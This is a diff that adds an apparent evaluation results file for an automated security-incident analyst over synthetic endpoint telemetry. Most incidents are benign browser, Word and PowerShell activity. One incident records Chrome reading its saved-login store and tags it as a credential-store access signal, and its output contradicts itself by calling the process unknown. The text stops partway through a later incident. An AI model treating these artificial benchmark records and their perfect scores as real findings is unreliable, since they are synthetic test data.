@@ -1,0 +1,4321 @@
+{
+  "summary": {
+    "backend": "rule_based",
+    "prompt_version": "analyst-v1",
+    "n_incidents": 61,
+    "schema_valid_rate": 1.0,
+    "grounding_rate": 1.0,
+    "hallucination_rate": 0.0,
+    "no_unsupported_claim_rate": 1.0,
+    "incidents_with_unknown_ids": 0,
+    "concealed_unsupported_claims": 0,
+    "classification_accuracy": 1.0,
+    "classification_precision": 1.0,
+    "classification_recall": 1.0,
+    "classification_f1": 1.0
+  },
+  "incidents": [
+    {
+      "incident": {
+        "incident_id": "INC-0001",
+        "events": [
+          {
+            "id": "E000001",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000002",
+            "type": "browser_event",
+            "fact": "chrome navigate https://teams.example.net/ [page=benign_website]"
+          },
+          {
+            "id": "E000003",
+            "type": "dns_query",
+            "fact": "DNS query for www.wikipedia.org (rare=False)"
+          },
+          {
+            "id": "E000004",
+            "type": "network_connect",
+            "fact": "outbound connection to pypi.example.com (198.51.100.7:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0211,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0001",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000001",
+          "E000002"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0002",
+        "events": [
+          {
+            "id": "E000005",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000006",
+            "type": "browser_event",
+            "fact": "chrome navigate https://docs.example.com/ [page=benign_website]"
+          },
+          {
+            "id": "E000007",
+            "type": "dns_query",
+            "fact": "DNS query for docs.example.com (rare=False)"
+          },
+          {
+            "id": "E000008",
+            "type": "network_connect",
+            "fact": "outbound connection to www.wikipedia.org (192.0.2.44:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0211,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0002",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000005",
+          "E000006"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0003",
+        "events": [
+          {
+            "id": "E000009",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000010",
+            "type": "browser_event",
+            "fact": "chrome navigate https://cdn.example.com/ [page=benign_website]"
+          },
+          {
+            "id": "E000011",
+            "type": "dns_query",
+            "fact": "DNS query for www.wikipedia.org (rare=False)"
+          },
+          {
+            "id": "E000012",
+            "type": "network_connect",
+            "fact": "outbound connection to mail.example.net (192.0.2.10:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0211,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0003",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000009",
+          "E000010"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0004",
+        "events": [
+          {
+            "id": "E000013",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000014",
+            "type": "browser_event",
+            "fact": "chrome navigate https://backup.example.com/ [page=benign_website]"
+          },
+          {
+            "id": "E000015",
+            "type": "dns_query",
+            "fact": "DNS query for pypi.example.com (rare=False)"
+          },
+          {
+            "id": "E000016",
+            "type": "network_connect",
+            "fact": "outbound connection to pypi.example.com (192.0.2.10:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0211,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0004",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000013",
+          "E000014"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0005",
+        "events": [
+          {
+            "id": "E000017",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000018",
+            "type": "browser_event",
+            "fact": "chrome navigate https://docs.example.com/ [page=benign_website]"
+          },
+          {
+            "id": "E000019",
+            "type": "dns_query",
+            "fact": "DNS query for mail.example.net (rare=False)"
+          },
+          {
+            "id": "E000020",
+            "type": "network_connect",
+            "fact": "outbound connection to backup.example.com (198.51.100.7:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0211,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0005",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000017",
+          "E000018"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0006",
+        "events": [
+          {
+            "id": "E000021",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000022",
+            "type": "browser_event",
+            "fact": "chrome navigate https://update.example.org/ [page=benign_website]"
+          },
+          {
+            "id": "E000023",
+            "type": "dns_query",
+            "fact": "DNS query for backup.example.com (rare=False)"
+          },
+          {
+            "id": "E000024",
+            "type": "network_connect",
+            "fact": "outbound connection to docs.example.com (192.0.2.44:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0211,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0006",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000021",
+          "E000022"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0007",
+        "events": [
+          {
+            "id": "E000025",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000026",
+            "type": "browser_event",
+            "fact": "chrome navigate https://backup.example.com/ [page=benign_website]"
+          },
+          {
+            "id": "E000027",
+            "type": "dns_query",
+            "fact": "DNS query for pypi.example.com (rare=False)"
+          },
+          {
+            "id": "E000028",
+            "type": "network_connect",
+            "fact": "outbound connection to mail.example.net (198.51.100.23:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0211,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0007",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000025",
+          "E000026"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0008",
+        "events": [
+          {
+            "id": "E000029",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000030",
+            "type": "browser_event",
+            "fact": "chrome navigate https://www.wikipedia.org/ [page=benign_website]"
+          },
+          {
+            "id": "E000031",
+            "type": "dns_query",
+            "fact": "DNS query for mail.example.net (rare=False)"
+          },
+          {
+            "id": "E000032",
+            "type": "network_connect",
+            "fact": "outbound connection to www.wikipedia.org (192.0.2.44:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0211,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0008",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000029",
+          "E000030"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0009",
+        "events": [
+          {
+            "id": "E000033",
+            "type": "process_create",
+            "fact": "process WINWORD.EXE (Microsoft Corporation) launched: WINWORD.EXE report.docx"
+          },
+          {
+            "id": "E000034",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\report17.docx [documents] signed=None"
+          },
+          {
+            "id": "E000035",
+            "type": "file_modify",
+            "fact": "file_modify: C:\\Users\\synthetic_user\\Documents\\report6.docx [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0197,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0009",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000033",
+          "E000034"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0010",
+        "events": [
+          {
+            "id": "E000036",
+            "type": "process_create",
+            "fact": "process WINWORD.EXE (Microsoft Corporation) launched: WINWORD.EXE report.docx"
+          },
+          {
+            "id": "E000037",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\report56.docx [documents] signed=None"
+          },
+          {
+            "id": "E000038",
+            "type": "file_modify",
+            "fact": "file_modify: C:\\Users\\synthetic_user\\Documents\\report80.docx [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0197,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0010",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000036",
+          "E000037"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0011",
+        "events": [
+          {
+            "id": "E000039",
+            "type": "process_create",
+            "fact": "process WINWORD.EXE (Microsoft Corporation) launched: WINWORD.EXE report.docx"
+          },
+          {
+            "id": "E000040",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\report29.docx [documents] signed=None"
+          },
+          {
+            "id": "E000041",
+            "type": "file_modify",
+            "fact": "file_modify: C:\\Users\\synthetic_user\\Documents\\report7.docx [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0197,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0011",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000039",
+          "E000040"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0012",
+        "events": [
+          {
+            "id": "E000042",
+            "type": "process_create",
+            "fact": "process WINWORD.EXE (Microsoft Corporation) launched: WINWORD.EXE report.docx"
+          },
+          {
+            "id": "E000043",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\report87.docx [documents] signed=None"
+          },
+          {
+            "id": "E000044",
+            "type": "file_modify",
+            "fact": "file_modify: C:\\Users\\synthetic_user\\Documents\\report9.docx [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0197,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0012",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000042",
+          "E000043"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0013",
+        "events": [
+          {
+            "id": "E000045",
+            "type": "process_create",
+            "fact": "process WINWORD.EXE (Microsoft Corporation) launched: WINWORD.EXE report.docx"
+          },
+          {
+            "id": "E000046",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\report32.docx [documents] signed=None"
+          },
+          {
+            "id": "E000047",
+            "type": "file_modify",
+            "fact": "file_modify: C:\\Users\\synthetic_user\\Documents\\report78.docx [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0197,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0013",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000045",
+          "E000046"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0014",
+        "events": [
+          {
+            "id": "E000048",
+            "type": "process_create",
+            "fact": "process WINWORD.EXE (Microsoft Corporation) launched: WINWORD.EXE report.docx"
+          },
+          {
+            "id": "E000049",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\report26.docx [documents] signed=None"
+          },
+          {
+            "id": "E000050",
+            "type": "file_modify",
+            "fact": "file_modify: C:\\Users\\synthetic_user\\Documents\\report65.docx [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0197,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0014",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000048",
+          "E000049"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0015",
+        "events": [
+          {
+            "id": "E000051",
+            "type": "process_create",
+            "fact": "process WINWORD.EXE (Microsoft Corporation) launched: WINWORD.EXE report.docx"
+          },
+          {
+            "id": "E000052",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\report79.docx [documents] signed=None"
+          },
+          {
+            "id": "E000053",
+            "type": "file_modify",
+            "fact": "file_modify: C:\\Users\\synthetic_user\\Documents\\report92.docx [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0197,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0015",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000051",
+          "E000052"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0016",
+        "events": [
+          {
+            "id": "E000054",
+            "type": "process_create",
+            "fact": "process WINWORD.EXE (Microsoft Corporation) launched: WINWORD.EXE report.docx"
+          },
+          {
+            "id": "E000055",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\report18.docx [documents] signed=None"
+          },
+          {
+            "id": "E000056",
+            "type": "file_modify",
+            "fact": "file_modify: C:\\Users\\synthetic_user\\Documents\\report12.docx [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0197,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0016",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000054",
+          "E000055"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0045",
+        "events": [
+          {
+            "id": "E000141",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -File health_check.ps1"
+          },
+          {
+            "id": "E000142",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\health_check.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0184,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0045",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000141",
+          "E000142"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0046",
+        "events": [
+          {
+            "id": "E000143",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -File health_check.ps1"
+          },
+          {
+            "id": "E000144",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\health_check.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0184,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0046",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000143",
+          "E000144"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0047",
+        "events": [
+          {
+            "id": "E000145",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -File health_check.ps1"
+          },
+          {
+            "id": "E000146",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\health_check.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0184,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0047",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000145",
+          "E000146"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0048",
+        "events": [
+          {
+            "id": "E000147",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -File health_check.ps1"
+          },
+          {
+            "id": "E000148",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\health_check.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0184,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0048",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000147",
+          "E000148"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0049",
+        "events": [
+          {
+            "id": "E000149",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -File health_check.ps1"
+          },
+          {
+            "id": "E000150",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\health_check.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0184,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0049",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000149",
+          "E000150"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0050",
+        "events": [
+          {
+            "id": "E000151",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -File health_check.ps1"
+          },
+          {
+            "id": "E000152",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\health_check.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0184,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {}
+      },
+      "output": {
+        "incident_id": "INC-0050",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "low",
+        "claims": [],
+        "supporting_evidence": [],
+        "contradicting_evidence": [
+          "E000151",
+          "E000152"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 0,
+        "claims_grounded": 0,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0063",
+        "events": [
+          {
+            "id": "E000183",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000184",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000185",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (198.51.100.7:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0876,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {
+          "browser_store_access": [
+            "E000184"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0063",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000184"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000184"
+        ],
+        "contradicting_evidence": [
+          "E000183",
+          "E000185"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0064",
+        "events": [
+          {
+            "id": "E000186",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000187",
+            "type": "file_access",
